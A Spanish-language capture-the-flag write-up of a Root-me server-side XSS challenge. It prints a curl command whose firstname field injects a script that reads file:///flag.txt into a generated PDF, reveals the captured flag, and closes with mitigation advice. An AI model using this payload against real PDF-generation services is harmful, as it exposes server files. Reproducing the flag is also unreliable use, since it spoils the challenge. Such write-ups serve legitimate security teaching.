---

# Root-me Write-up: Server-Side XSS (Dynamic PDF Generation)

## 1. Reconocimiento Inicial

Al realizar una petición general a la raíz del sitio, se identificó un sistema de generación de certificaciones ("Root-Me attestations generator"). El análisis del HTML reveló dos endpoints críticos: `/signup.php` para registrar usuarios y `/login.php` para acceder.

```bash
curl -v http://challenge01.root-me.org:59083/

```

Se observó que los datos del perfil de usuario (nombre y apellido) se utilizan posteriormente para rellenar un documento dinámico generado por el servidor (`/generate.php`).

## 2. Identificación de la Vulnerabilidad

La vulnerabilidad es un **Server-Side Cross-Site Scripting (SSXSS)**. El servidor toma los campos de entrada del usuario y los procesa mediante un motor de renderizado en el backend. Al no existir una sanitización adecuada, el servidor ejecuta cualquier código JavaScript inyectado como si fuera parte de su propia lógica local.

## 3. Explotación (Infiltración de Script)

Para obtener la flag, se decidió inyectar un script en el campo `firstname` durante el registro. El objetivo es forzar al servidor a leer el archivo local `flag.txt` utilizando el protocolo `file:///`.

**Comando de inyección:**

```bash
curl -v -X POST http://challenge01.root-me.org:59083/signup.php \
     -d "login=exploit_user" \
     -d "firstname=<script>var x=new XMLHttpRequest();x.onload=function(){document.write(this.responseText)};x.open('GET','file:///flag.txt');x.send();</script>" \
     -d "lastname=bot" \
     -d "password=password123"

```

### Explicación del Payload:

* **`XMLHttpRequest()`**: Crea una petición asíncrona dentro del proceso de renderizado del servidor.
* **`file:///flag.txt`**: Abusa del protocolo local para acceder al sistema de archivos del servidor en lugar de a una URL externa.
* **`document.write()`**: Escribe el contenido recuperado del archivo directamente en el documento que el servidor está generando.

## 4. Obtención de la Flag

Tras registrar el usuario con el payload, procedimos a loguearnos y solicitar la generación del certificado. El servidor, al procesar el nombre del usuario, ejecutó el JavaScript, leyó el archivo interno y lo plasmó en el resultado final.

**Resultado exfiltrado:**
`s3rv3r_s1d3_xss_1s_w4y_m0r3_fun`

---

## Recomendaciones de Seguridad

* **Sanitización de Entradas:** Todas las entradas del usuario deben ser filtradas (HTML Entities) antes de ser enviadas a motores de renderizado de PDF o HTML.
* **Desactivar Ejecución de Scripts:** Si se utilizan herramientas como `wkhtmltopdf`, se deben deshabilitar las opciones de ejecución de JavaScript (`--disable-javascript`).
* **Restricción de Protocolos:** El motor de renderizado no debe tener permisos para utilizar el protocolo `file:///`, limitándolo exclusivamente a peticiones `http` o `https` controladas.

